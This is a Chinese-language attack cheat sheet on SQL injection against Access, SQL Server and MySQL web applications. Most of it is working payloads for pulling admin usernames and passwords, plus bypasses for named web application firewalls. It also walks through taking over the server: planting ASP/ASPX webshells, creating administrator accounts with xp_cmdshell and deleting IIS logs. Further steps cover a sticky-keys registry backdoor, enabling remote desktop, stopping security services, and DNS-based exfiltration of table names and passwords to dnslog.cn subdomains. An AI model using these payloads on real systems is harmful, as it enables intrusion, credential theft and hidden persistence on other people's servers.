# SQL注入漏洞

&nbsp;

## 数据库搭配

* 简单的站点一般是asp/aspx搭配access
* 有时asp搭配sqlserver（一般为学校网站）
* php一般搭配mysql数据库
* jsp一般搭配mysql，sqlserver，oracle（oracle一般是大型企业使用，费用较贵）
>注入针对数据库，而注入漏洞存在于脚本

>有时会存在伪静态，即后缀为html，但是换成jsp，asp也会访问到主页，则为伪静态

&nbsp;


## Access数据库注入

### 【Access数据库】

Access数据库为一个文件，可以使用Microsoft软件打开，不同于mysql，sqlsrver，不使用服务，调用文件就可以访问。

### 【Access注入挖掘】

* **判断是否有注入**
  * 在页面url中含有？id=数字，后接上一下语句判断
  * and 1=1 页面返回正常
  * and 1=2 页面返回错误
  * 当有waf拦截时，/ 页面返回错误，-0 页面返回正常
  * 满足以上注入语句，可以判断含有sql注入

* **判断是否有字符注入**
  * 一般会用单引号引起，拿去匹配数据库
  * 要使用单引号闭合来进行注入，输入一个引号看是否会报错
  * 逻辑型（字符型注入）：' and '1'='1/' and '1'='

* **判断是否是搜索型注入**
  * 逻辑型（搜索型注入）：%' and 1=1 and '%'='/%' and 1=2 and '%'='

* **判断数据库类型**
  * 方法1：and (select count(*) from sysobjects)>0  ，and (select count(*) from msysobjects)>0  ，sysobjects 正常，msysobjects不正常，则为sql表，sysobjects和msysobjects都不正常，或者sysobjects不正常，msysobjects正常，则为access表
  * 方法2：在地址栏上显示的连接所带的参数后面加些特殊符号，看它的报错信息，如  http://www.abc.com?id=1’  则回返回错误，如果是Microsoft JET Database Engine错误’80040e14’的话，则说明网站所用的数据库是Access数据库。
  * 方法3：如果目标数据库同时支持len函数和chr函数，且不支持length和char函数，则很可能是Access数据库。在不返回报错信息的情况下，这种方式是我最常用的。

### 【union联合查询】

* **猜列数**
  * 首先使用order by ...语句测试是否有union联合查询漏洞，即输入order by 1 网站返回正常
  * 使用order by 语句猜出该页面数据表中有多少列，即order by 1，order by 2........直到order by n时，页面出现错误，则表有n-1列

* **猜表名**
  * 使用union select 1，2，3......，n-1 from 表名（一般使用字典，爆破出管理员数据表名），当页面显示，则存在该表名**输出页面中会有数字输出，表示该列数据类型为字符串**
  * 在提交注入查询语句后，如果获得的HTML返回和正常页面一样，则表存在。
  ```sql
  ' AND (SELECT TOP 1 1 FROM TableNameToBruteforce[i])
  
  AND exists(select * from tablename)
  ```
* **猜列名**
  * 普通查询语句
  ```sql
  union select name，2，3，.....，password from admin（输出admin表中的name和password）
  ```
  
  * 如果站点SQL查询语句为 select id,name,address from 表名
  ```sql
  ?id=25 group by 1 having 1=1(数字型)                 如果字符型就 'group by 1 having '1'='1'
  ```
  此时会有报错信息，信息中显示了第一个列名    Microsoft JET Database Engine (0x80040E21) 
  试图执行的查询中不包含作为合计函数一部分的特定表达式 'id' 。
  ```sql
  爆出id字段，继续，productshow.asp?id=25 group by 1,id having 1=1
  返回错误：
  Microsoft JET Database Engine (0x80040E21) 
  试图执行的查询中不包含作为合计函数一部分的特定表达式 'email' 。
  ```
  ```sql
  依次类推productshow.asp?id=25 group by 1,id,email having 1=1，可以爆出目标表中的所有字段。
  ```
  
### 【bool盲注】

* **使用条件**
  使用and 1=1，页面返回正常，输入and 2=1时，页面返回错误，存在bool盲注
  
* **猜表名**
  * 判断所要查的表名是否存在，and exists（select * from 表名），使用字典跑，页面输出正常则，猜中表名，举例表名为admin

* **猜列名**
  * 判断列名是否存在，and exists （select 列名 from admin），使用字典跑，页面输出正常则，猜中列名，举例列名为user

* **猜内容**
  * and （select top 1 asc（mid（user，1，1））from admin）>100  将user列中第一个行数据，从第一个字母开始，向后数一个，截取出来，经过ascii码变成数字，通过大于小于某个数，一个一个判断该数据是什么（当联合查询不起作用时使用）

* **确定其他表的字段数**
  * 确定目标表的字段数量
  * ?id=1513 and exists(select * from admin order by 6)
  页面返回正常，说明admin有6个字段
  
### 【Access逐字猜解法】

* **判断账户密码的长度**
  * and (select len(admin) from admin)=5  如果返回正常说明管理员账户的长度为5
  * and (select len(password) from admin)=5  猜解管理密码长度是否为5

* **猜解管理员账号的第一个数据（通过判断ascii码来判断）**
  * and (select top 1 asc(mid(admin,1,1)) from admin)>100 返回正常说明大于，不正常说明不大于
  * and (select top 1 asc(mid(admin,1,1)) from admin)>50  返回正常说明大于
  * and (select top 1 asc(mid(admin,1,1)) from admin)=97  返回正常说明等于97 97对应的字母为a

### 【分段偏移注入】

* **偏移注入**
  * 首先使用联合查询，猜出含有多少列，union select 1 from admin，union select 1，2 from admin 直到页面成功返回
  * 用*号从最后一个字段数向前逐个删除来代替，直到显示正常，union select 1，2，3，4，* from admin，union select 1，2，3，* from admin，union select 1，2，* from admin
  * 会随机爆出该表中的一些数据
  >局限性：当页面输出信息较少时，不建议使用此方法，由于随机爆出信息，则可能爆不出admin账号和密码

* **分段偏移注入**
  * 分段偏移注入基本公式：
  联合查询所要补充的字段数 = 当前字段数量 - 目标表的字段数 x N（N=1,2...）（注意：“联合查询所要补充的字段数” 指的是union关键字后面的select查询所需补充的字段数）
  在此处即为：联合查询补充字段数 = 当前字段数量（22） - admin表的字段数（6） x N
  当N=1时我们称为 “1级偏移注入”，当N=2时我们称为 “2级偏移注入”；当N=3时我们称为 “3级偏移注入”，...

  * 一级偏移注入：
  根据公式我们可以计算出：联合查询补充字段数 = 22-6x1 = 16
  ?id=1513 union select top 1 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16, * from admin
  在这里我们解释一下，为什么1级偏移注入并没有爆出我们想要的字段值呢
  我们可以进行2级(多级)偏移注入（即通过admin表的自连接使得sql语句中“ * ”所代表的的字段数增大，那么联合查询中用于充数字段就会减小，这样的话，admin表中的数据自然会向前移动了）
  
  * 二级偏移注入：
  根据公式我们可以计算出：联合查询补充字段数 = 22-6x2 = 10
  ?id=1513 union select 1,2,3,4,5,6,7,8,9,10, * from (admin a inner join admin b on a.id=b.id)
  经过2级偏移注入，我们成功的将admin表的数据向前移动了6个字段，使其原本在17号字段及其之后才显现出的数据，变为了在11号字段及其之后就可回显而出。而此时admin表的password字段和count_time字段恰好处于显示位13和15上，于是就自然而然的暴露了出来。
  由于admin表进行了一次自连接，使得payload中from关键字后面的表由原有的 “admin表” 变成了：由“先让admin自己做笛卡尔积然后挑选id值相等的记录”组成的表。这样的话，payload中的“ * ”就由原来所代表的 “admin表” 中的6个字段，变为了现在所代表的 “admin自连接表” 的12个字段，又由于union关键字的使用，要求union关键字后面select查询的字段数必须要等于前面select查询的字段数，所以union关键字后面的select中用于充数的字段由原来的22-6=16变为了22-12=10个字段，因此由于充数的字段变少了，那么admin表的数据自然的就可以向前移动了。
  请注意：admin表中的数据向前移动的字段数只能是admin表（即目标表）字段数的整数倍（这是由表自连接的特性所决定的
  
  * 三级偏移注入：
  向前逐个删除差值个数后，查询语句后加上 from （（admin as a inner join admin as b on a.id=b.id）inner join admin as c on a.id=c.id），爆出第三个数据
  
  * 微调payload
  ?id=1513 union select top 1 1,2,3,4,5,6,7,8,9,10,b.id, * from (admin a inner join admin b on a.id=b.id)
  根据页面返回的数据，我们可以看到，在第13号显示位我们成功的爆出了admin字段的第一个值:admin


### 【跨库查询】

* **条件**
  * 条件:同服务器下的站点有注入,知道对方站的数据库绝对路径，知道对方数据库表，表中的字段名可以用这个方法来跨库查询.
  * a是目标站点 b是存在注入的站点 a,b是同服务器的站点
  * admin为数据库中的表，user为数据库中admin表的段，password为数据库中admin表的段.
  ```
  http://xxx.com/news/type.asp?type?id=1 and 1=2 union select 1,2,user,4,5,6 from [D:\wwwroot\1\Databases\xycms.mdb].admin
  http://127.0.0.1:81/0/Production/PRODUCT_DETAIL.asp?id=1451 union select 1,2,username,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from [D:\wwwroot\1\Databases\xycms.mdb].admin
  http://127.0.0.1:99/0/Production/PRODUCT_DETAIL.asp?id=-1513%20UNION%20SELECT%201,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22%20from%20admin_user%20in%20'C:\Users\Seven\Desktop\webpentest\1\xydata\xycms.mdb'
  ```
### 【通用型防注入代码绕过】
* **通用弹窗拦截**
  改变提交方式，GET变POST，POST变cookie提交
  
* **代码防御**
  +号代替空格，%0a或%a0代替空格，使用编码绕过（使用url编码）

* **wts绕过**
  使用%%%%%%0a代替空格
  
* **360绕过**
  使用%0a代替空格
  
* **安全狗绕过**
  使用aid=123/*&id=12 and 1=1 &bid=123\*/绕过
  
* **宝塔绕过**
  使用%截断关键字，即id=123 an%%%%d 1%%%=%%1，或者使用大小写混写
  
* **使用双写：aandnd**

* **使用大小写混写**

* **使用%00对关键字截断**

&nbsp;

## SqlServer数据库注入

### 【SqlServer数据库】

* **SqlServer数据库介绍**
  * 中小型企业使用，access数据库不能处理数据库大小大于100M的，所以SqlServer可以处理
  * aspx+sqlserver
    asp+sqlserver
    jsp+sqlserver

* **Sqlserver服务**
  * 1433端口是开启的。当我们关闭服务后，端口也将关闭。
  * 后缀 cracer.mdf ，日志文件后缀 cracer_log.ldf

* **Sqlserver数据库权限**
  * sa权限：数据库操作，文件管理，命令执行，注册表读取等
  * db权限：文件管理，数据库操作
  * public权限：数据库操作
  >默认开放远程连接，1433端口连接，默认是sa用户权限（即最高权限）

* **kali远程连接MSSql**
  ```bash
  impacket-mssqlclient Adminestrator:Lab123@192.168.2.100 -windows-auth
  ```
  这将强制进行NTLM身份验证(与Kerberos相反)

### 【Sqlserver注入挖掘】

* **判断是否有注入**
  * 在页面url中含有？id=数字，后接上一下语句判断
  * and 1=1 页面返回正常
  * and 1=2 页面返回错误
  * / 页面返回错误
  * -0 页面返回正常
  * 满足以上注入语句，可以判断含有sql注入

* **判断数据库**
  * and （select count（*） from sysobjects）>0 注入后页面返回正常，则是sqlserver数据库
  * and （select count（*） from msysobjects）>0 注入后页面返回正常，则是access数据库

### 【显错注入】

* **探测漏洞信息**
  * id=1 and 1=(select @@version) 数据库版本
  * id=1 and 1=(select db_name()) 当前使用的数据库

* **列数据库名称**
  * 获取第一个用户数据库名，dbid为数据库在sqlserver中的id，一般前4个为系统自带的数据库
  ```sql
  and 1=(select top 1 name from master..sysdatabases where dbid>4) 
  ```
  
  * 当列出第一个数据库名后可以 
  ```sql
  and 1=(select top 1 name from master..sysdatabases where dbid>4 and name <> 'test') 
  ```
  列出除去查出来的数据库名
  
  * 列出所有数据库名
  ```sql
  and 1=(select name from master..databases for xml path) 
  ```
  
* **列表名**
  * 获取第一张表
  ```sql
  id=1 and 1=(select top 1 name from sysobjects where xtype='u') 
  ```
  
  * 获取第二张表
  ```sql
  id=1 and 1=(select top 1 name from sysobjects where xtype='U' and name <> '之前查过的表名')
  ```
  
  * 列出所有表名
  ```sql
  id=1 and 1=(select name from sysobjects where xtype='u' for xml path) 
  ```
  
* **列表的列名(假设获取users列名)**
  * 获取第一列列名
  ```sql
  id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='users'))
  ```
  
  * 获取第二列列名
  ```sql
  id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='users') and name <> '之前查过的列名')
  ```
  
  * 列出所有列名
  ```sql
  id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='users') for xml path) 
  ```
  
* **列出数据**
  ```sql
  id=1 and 1=(select pass from admin)
  ```
  
### 【union 联合查询】

* **表的列数**
  * id =1 order by 4 不断从1，2，3，4，5.....直到页面报错 ，得到表的列数

* **版本信息或取**
  * id=1 union select null,@@version,db_name(),null,null    查询版本和数据库名  **sqlserver在select后不能加数字，要加null，因为不知道该列是否为字符列，会报错**

* **列数数据库名**
  * 通过改变dbid数值列出所有数据库
  ```sql
  id=1 union select null,(select name from master.dbo.sysdatabases where dbid=1),null 
  ```
  
* **列出表名**
  * 查询其他数据库的表名
  ```sql
  id=1 union select null,(select top 1 name from [dbname]..sysobjects where xtype='u' and name not in(select top 0 name from [dbname]..sysobjects where xtype='u')),null,null
  ```
  
  *  列出第一个表名
  ```sql
  id=1 union select null,(select top 1 name from (select top 1 name from sysobjects where xtype=0x75 order by name) t order by name desc),null 
  ```
  
  * 列出第二个表名
  ```sql
  id=1 union select null,(select top 2 name from (select top 1 name from sysobjects where xtype=0x75 order by name) t order by name desc),null
  ```
  
* **列出列名(假设表名为admin)**
  * 改变object_id后的数字，来累出表中所有列名
  ```sql
  id=1 union select null,(select col_name(object_id('admin'),1)),null
  ```
  
### 【权限利用】

* **权限判断**
  *  判断是否是系统管理员
  ```sql
  id=1 and 1=(select is_srvrolemember('sysadmin'))  
  ```
  
  * 判断是否是库权限
  ```sql
  id=1 and 1=(select is_srvrolemember('db_owner')) 
  ```
  
  * 判断是否是public权限
  ```sql
  id=1 and 1=(select is_srvrolemember('public')) 
  ```
  
  * 判断是否有库读取权限
  ```sql
  id=1 and 1=(select HAS_DBACCESS('master'))   ```
  >is_srvrolemember函数返回1代表是，0代表否

* **Sa权限利用**
  * 修改网站管理员密码
  当获得管理员密码，但是md5解不出来时，可以使用sql语句更改管理员密码：
  ```sql
  id=1;update admin set pass='adfasdfadfas' where admin='cracer'
  ```
  
  * 直接getshell 使用sp_makewebtask

    1）修复上传 :
    ```sql
    id=1;EXEC sp_configure 'show advanced options',1;
    RECONFIGURE;
    exec sp_configure 'Web Assistant Procedures',1;
    ```
  
    2）getshell：
    ```sql
    ;exec sp_makewebtask
     'C:\Inetpub\wwwroot\8005\x1.asp','select''<%execute(request("cmd"))%>'''--'
    ```
    
    3）执行：
    [@outputfile =] 'outputfile'
    在 Microsoft® SQL Server™ 的实例上生成的 HTML 文件的位置。如果文档将在远程计算机上生成，则该参数可以是 UNC 名称。outputfile 的数据类型为 nvarchar(255)，没有默认值。

    [@query =] 'query'
    要运行的查询。query 的数据类型为 ntext，没有默认值。当通过 sp_runwebtask 运行任务时，查询结果将以表格形式显示在 HTML 文档中。可以指定多个 SELECT 查询，从而导致在 outputfile 中显示多个表。
    
  * 调用系统命令 使用xp_cmdshell（创建系统管理员，操控文件，操控日志文件，getshell）
  
    1）判断xp_cmdshell扩展是否存在
    ```sql
    id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell')
    ```
    2）判断xp_regread扩展是否存在
    ```sql
    id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_regread')
    ```
    3）恢复上传
    ```sql
    exec sp_configure 'show advanced options',1;
    RECONFIGURE;
    exec sp_configure 'xp_cmdshell',1;
    RECONFIGURE;
    ```
    
    4）新建用户
    ```sql
    ;exec master..xp_cmdshell 'net user test test /add'    创建用户
    ;exec master..xp_cmdshell 'net localgroup administrators test /add'    添加test到管理员组
    ```
    5）操控日志
    ```sql
    ;exec master.dbo.xp_cmdshell 'del C:\winnt\system32\logfiles\w3svc5\.......log'     删除日志
    ```
    6）Getsehll
    ```sql
    echo ^<%Execute(request("a"))%^> >d:\www\123.asp
    ;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> >c:\\www\\233.asp'; --
    ```
    7）删除注册表
    ```sql
    reg delete HKLM\SOFTWARE\McAfee /f    删除注册表
    Regedit /s d:\web\zh\hp.reg      导入注册表
    ```
    
  * 系统服务操作（关闭系统防火墙，安全软件）
    1）关闭服务
    exec master..xp_servicecontrol 'stop','服务名'      停掉某个服务，需要sa权限
    exec master..xp_servicecontrol 'start','服务名'      开启某个服务
    
  * 注册表操作（创建后门）
    1）写入shift后门
    ```sql
    exec xp_regwrite 0x484b45595f4c4f43414c5f4d414348494e45,0x534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c496d6167652046696c6520457865637574696f6e204f7074696f6e735c73657468632e657865,0x6465627567676572,0x5245475f535a,'c:\\windows\/system32\\taskmgr.exe'--      利用注册表将5次shift提示更换成任务管理器
    ```
    2）开启3389
    ```sql
    ;exec master..xp_cmdshell 'sc config termservice start=auto
    ;exec master..xp_cmdshell 'net start termservice'
    exec master..xp cmdshell 'reg add "HKEY LOCAL 'MACHINE\SYSTEM CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f'
    ```
    
  
* ** dbowner权限利用**
  * 遍历目录
    1）搜索web目录
    ```sql
    ;create table temp(dir nvarchar(255) ,depth varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));--
    ;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree 'c:',1,1--
    and(select dir from temp where id=1)>0      由于不能一次性获取所有web目录，所以要改变id值
    ```
  * Getshell
    1）找到web目录后，可以写入一句话木马
    ```sql
    ;alter database ssdown5 set RECOVERY FULL
    ;create table test(str image)--
    ;backup log ssdown5 to disk='c:\test' with init--
    ;insert into test(str)values ('<%excute(request("cmd"))%>')-- 
    ;backup log ssdown5 to disk='c:\inetpub\wwwroot\x.asp'-- 
    ;alter database ssdown5 set RECOVERY simple
    ```

&nbsp;

## MySql数据库注入

### 【MySql数据库】

* **mysql数据库介绍**
  * linux上的免费数据库，一般搭配php使用一般会有两种集成框架：
  lamp （linux+apache+mysql+php）
  lnmp （linux+ngix+mysql+php）
  
* **mysql相关函数**
  * system_user()    系统用户名
  * current_user    当前用户名
  * database()    数据库名
  * version()     mysql数据库版本
  * load_file()     读取本地文件函数
  * @@datadir    读取数据库路径
  * @@basedir    mysql安装路径
  * @@version_compile_os    操作系统

* **mysql注释**
  * 注释符：#、--、/**/
  * 内联注释：/*！union*/和/*!50001union*/
  * 用+、%0a/%0D/和/*ADJFKLASDF--234U23SJFD AND 1=1*/代替空格
  * 用%或者/**/、%00、%01分割sql语句

### 【mysql数据库注入挖掘】

* **查看版本**
  * 显示出mysql的版本
  ```sql
  id=-1 union select 1,version(),2,3,4 
  ```
  
  * 查看当前用户
  ```sql
  id=-1 union select 1,user(),2,3,4
  ```
  >低于5.0版本的mysql中没有information_schema这个库，无法得到数据库信息

* **判断是否有注入**
  * id =1 order by 4 不断从1，2，3，4，5.....直到页面报错 ，得到表的列数
  * id=-1 union select 1,2,3,4.......n   通过-报错，显示出那一列时字符列

* **判断是否有bool注入**
  * 注入语句：1' and 1=1 # （显示正确）
  * 注入语句：1' and 1=2 # （显示错误，或者显示网站错误页面）

* **判断是否有显错注入**
  * 注入‘或/时，网页会出现错误（sql语句出现干扰），使用/    -0      ’     ')   '"    '%23    '--  等等测试
  * 显错注入使用的函数：
  ```sql
  floor(),  extractvalue(),  updatexml(),  geometrycollection(),  multipoint(),  polygon(),  multipolygon(),  linestring(),  multilinestring(),  exp()
  ```
  
### 【Union联合注入】

* **列数据库名**
  * 列出当前使用的数据库名
  ```sql
  id=-1 union select 1,database(),2,3,4
  ```
  
* **列表名**
  * 列出所有数据库中的表名
  ```sql
  id=-1 union select 1,group_concat(table_name),2,3,4 from information_schema.tables where table_schema=’要查询的数据库名称‘  
  ```
  
* **列出列名**
  * 列出该表的所有列名
  ```sql
  id=-1 union select 1,group_concat(columns_name),2,3,4 from information_schema.columns where table_name=’要查询列的表名‘ 
  ```
  
* **列出每一列信息**
  ```sql
  id=-1 union select 1,group_concat(对应列名1，对应列名2),2,3,4 from 所要查找的表名
  ```
  
### 【bool盲注】

* **猜解当前数据库名**
  * 猜解数据库名长度
  ```sql
  1' and length(database())=1 #
  1' and length(database())=2 #
  1' and length(database())=3 # 
  1' and length(database())=4 # （直到页面出现错误）
  ```
  
  * ⼆分法逐字猜解
  ```sql
  1' and ascii(substr(database(),1,1))>97 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼤于 97（⼩写字母a的ascii值）；
  ```
  重复以上步骤直到得出完整的数据库名dvwa
  
* **猜解表名**
  * 猜解表的数量
  ```sql
  1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 显⽰不存在
  ```
  ```sql
  1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 # 显⽰存在
  ```
  原理是使用count()这个函数来判断table_name这个表的数量有几个
  然后后面有一个where判断来指定是当前数据库
  在末尾有一个 =1 ，意思是判断表有1个，正确那么页面返回正常，错误即返回不正常
  
  * 猜表的名字
  猜解第一个表名的第一个字符长度是否为：g
  ```sql
  1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 # 返回正常
  ```
  语法格式是：
  ```sql
  1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit i,1),n,1))>97 #
  ```
  i 是第几个表
  n 是第几个字符长度
  
* **猜解表中的字段名**
  * 猜解第一个字段名的第一个字符为：u
  ```sql
  1' and ascii(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1,1))=117 #
  ```
  
  * 猜解第一个字段名的第二个字符为：s
  ```sql
  1' and ascii(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),2,1))=115 #
  ```
  
* **猜解数据**
  * 猜解 dvwa.users 表下的 user 列的第一个字段内容为：a
  ```sql
  1' and ascii(substr((select user from dvwa.users limit 0,1),1,1))=97 # 
  ```
  
### 【显错注入】

* **列数据库名**
  * 查看数据库名，修改limit后的数字0，可以查看每一个数据库名
  ```sql
  ' and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+
  ```
  
  * 查看当前数据库名
  ```sql
  ' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
  ```
  
* **列表名**
  * 列出当前数据库的表名，修改limit后的0，可以查看数据库中每一个表名
  ```sql
  ' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='要查找的数据库名' limit 0,1),0x7e),1)--+
  ```
  
* **列出列名**
  * 列出当前表的列名，修改limit后的0，可以查看表中每一个列名
  ```sql
  ' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='要查找的表名' limit 0,1),0x7e),1)--+
  ```
  
* **列出信息**
  * 列出user表中第一个username，修改limit后的0，可以列出第二个
  ```sql
  ' and updatexml(1,concat(0x7e,(select username from user limit 0,1),0x7e),1)--+      
  ```
  
>当字符列无法爆出信息时，则可以使用hex()函数将爆出的信息转换为16进制，则可以爆出  union select 1,group_concat(hex(username)),3,4 from manage_user

### 【mysql宽字节注入】

* **使用条件**
  当输入1'时发现点也被转义，以ascii字符显示出来时，可以采用宽字节注入绕过过滤

* **使用**
  前提：输入的'号被\进行转义，无法报错
  则可以使用宽字节注入，’号前加上%df
  >有时宽字节无法注入，可能是目标系统脚本使用utf-8编码，只有gbk编码才可以注入


### 【mysql长字节截断攻击】

* **条件**
  管理员和普通用户在一个表中
  用户名有一定长度限制，当普通用户注册时使用
  admin+++++++++++++++++，注册用户名时由于长度超过限制，会自动截断，变成admin，这样相当于增加了一个管理员账号


### 【权限利用】

* **获取根目录**
  * 报错显示
  * 谷歌黑客
  * site:目标网站 warning
  * 遗留文件 phpinfo info test php
  * 漏洞爆路径
  * 读取配置文件

* **文件读取**
  * 要使用hex转换路径，否则会被转义
  ```sql
  id=-1 union select 1,load_file(hex('要读取文件的路径')),2,3
  ```
  >load_file()函数，该函数是用来读取源文件的函数，只能读取绝对路径的网页文件，在使用load_file()时应先找到网站绝对路径

* **文件写入**
  ```sql
  id=-1 union select 1,"<?php phpinfo();?>",3,4,5 into ouotfile '写入文件的路径'
  ```
  >如果php版本为5.2.17时，会自动开启魔术引号，无法进行文件写入，php版本高于5。2.17时，魔术引号默认关闭

&nbsp;

## 其他类型注入

### 【各种提交方式的注入漏洞挖掘】

* **GET注入**
  例如：
  ```
  www.cracer.com/new.asp?id=11&ssid=123&bid=55
  And 1=1
  And 1=2
  / -0
  ‘    %bf’
  “
  ```
  一般使用特殊字符干扰引号闭合
  
* **POST注入**
  * 可能存在漏洞的位置：搜索框、登录、留言、注册
  例如：
  ```
  www.cracer.com/admin.php
  测试站点：
  http://testasp.vulnweb.com/login.asp?tfUPass=&tfUName=
  测试工具
  pangolin  sqlmap
  Xdcms +burp注入
  ```
  * 要使用burpsuit抓包后使用repeater重放攻击才有效
  * 有时注入点不一定是表单内容，而是表单名称，可以在表单名称后加上引号查看

* **cookie注入**
  * 原理
  Cookie的定义是这样的：Cookie是在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式。通常被用来辨别用户身份、进行session跟踪，最典型的应用就是保存用户的账号和密码用来自动登录网站和电子商务网站中的“购物车”。
  ASP中规定也可以省略集合名称，直接用这样的方式获取数据：request("参数名称")，当使用这样的方式获取数据时，ASP规定是按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的。这样，当我们使用request("参数名称")方式获取客户端提交的数据，并且没有对使用request.cookies("参数名称")方式提交的数据进行过滤时，Cookie注入就产生了。
  
  * 注入方法
  寻找形如“.asp?id=xx”类的带参数的URL。
  去掉“id=xx”查看页面显示是否正常，如果不正常，说明参数在数据传递中是直接起作用的。
  清空浏览器地址栏，输入“javascript:alert(document.cookie="id="+escape("xx"));”，按Enter键后弹出一个对话框，内容是“id=xx”，然后用原来的URL刷新页面，如果显示正常，说明应用使用Request("id")这种方式获取数据的。
  重复上面的步骤，将常规SQL注入中的判断语句带入上面的URL：“javascript:alert(document.cookie="id="+escape("xx and 1=1"));” “javascript:alert(document.cookie="id="+escape("xx and 1=2"));”。和常规SQL注入一样，如果分别返回正常和不正常页面，则说明该应用存在注入漏洞，并可以进行cookie注入。
  使用常规注入语句进行注入即可。
  >一般使用ie浏览器

* **HTTP头注入**
  * 常见注入参数
  User-agent
  Referer
  X-Forwarded-For
  Client-ip
  
  * 产生原因
  有些参数会写入数据库中，没有过滤则导致注入漏洞
  一般为字符串注入
  如果出现用户登录，用户留言，修改资料等方面，则很有可能出现client-ip等参数sql注入
  
  
### 【伪静态注入的挖掘】

* **方法**
  * 先去掉html看页面是否返回正常
  * 在数字后加入注入语句
  * 有一些伪静态可以改为xxx.php?id=11的形式


### 【延迟注入漏洞】

* **使用条件**
  * 用于，无法回现和无法显示错误页面的场景
  使用if(length(注入语句)=N,sleep(5),1)，改变N的值，如果条件成立，通过服务器的休眠时间，来判断是否存在延时注入点，如果休眠五秒，则存在延时注入，如果不休眠在则反之，不存在延时注入点！
  
  * 不同的mysql数据库版本，延迟注入语句也不同
  mysql >=5.0  的可以使用sleep()进行查询
  mysql<5.0  的可以使用benchmark()进行查询（benchmark用法：benchmark(n,sql语句)  n为查询次数，通过查询次数增多 时间变得缓慢来判断是否存在延迟）
  
* **注入思路**
  * 判断注入点时字符型还是数字型
  * 使用sleep语句猜测数据库名字长度
  * 猜测数据库由哪些字符组成
  * 猜列名
  * 猜数据

* **实战说明**
  * 第一步：判断注入点
  ```sql
  ?id=1' and sleep(5)-- -  //正常休眠
  ?id=1" and sleep(5)-- -  //无休眠
  ?id=1') and sleep(5)-- - //无休眠
  ?id=1") and sleep(5)-- - //无休眠
  ```
  总结：由此可以判断注入点为数值型注入点 包裹符号为'号
  
  * 第二步：判断当前数据库库名的长度
  ```sql
   ?id=1' and if(length(database())=8,sleep(10),1)-- -
  ```
  通过改变数据库的长度的值来判断，是数据库名，如：length(database())=N
  
  * 第三步：判断当前数据库下的库名
  ```sql
  ?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(10))-- -
  ```
  通过判断服务器没有睡眠，ascii码转换115为s ，那么就得出数据库第一个字符为s
  
  * 第四步：猜表名
  ```sql
  ?id=1' and if((select ascii(substr((select table_name from information_schema.tables where table_schema="security"limit 0,1),1,1)))=101,sleep(5),1)-- -
  ```
  
  * 第五步：猜字段名,猜数据
  猜字段语句：
  ```sql
  ?id=1' and if((select ascii(substr((select column_name from information_schema.columns where table_name="表名"limit 0,1),N,1)))=101,0,sleep(5))-- -
  ```
  猜数据：
  ```sql
  and if((select ascii(substr((select 字段名 from 库名.表名 limit 0,1),N,1)))=101,0,sleep(5))
  ```
  
### 【dnslog注入】

* **原理**
  * dnslog 平台会记录域名dns查询记录，通过我们把查询的结果和dns子域名拼接，发送给dnslog平台查询，就会记录我们的语句查询结果，从而快速提升延迟注入速度。

* **条件**
  * root权限（要借助load_file()函数）

* **实战**
  * dns 注入列表名
  ```sql
  and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='jian' limit 0,1),'.tunxf1.dnslog.cn\\abc'))),1,1)--+	#查表名
  ```
  ```sql
  and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='xycms' limit 0,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
  ```
  ```sql
  and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='xycms' limit 1,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
  ```
  
  * dns注入列列名
  ```sql
  and if((select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='user' limit 0,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
  ```
  ```sql
  and if((select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='user' and TABLE_SCHEMA='dbname' limit 0,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
  ```
  ```sql
  第二个列名
  and if((select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='user' limit 1,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
  ```
  
  * dns注入列数据
  ```sql
  and if((select load_file(concat('\\\\',(select username from user limit 0,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
  ```
  ```sql
  and if((select load_file(concat('\\\\',(select password from user limit 0,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
  ```
  
### 【二阶注入】

* **使用条件**
  * 简单的来说，就是第一次注入时，开发者进行了编码等限制，无法直接进行注入，但是在数据库中保留了我们注入的语句，程序在其它地方再次调用保存着我们注入的语句时发生了注入，这就是二阶注入，有点类似存储型XSS漏洞的意思。

* **实战步骤**
  * 通过代码审计找到cms中可以写入数据的地方
  * 写入时测试使用不同特殊字符查看是否过滤
  * 攻击者在一个HTTP请求中提交恶意输入
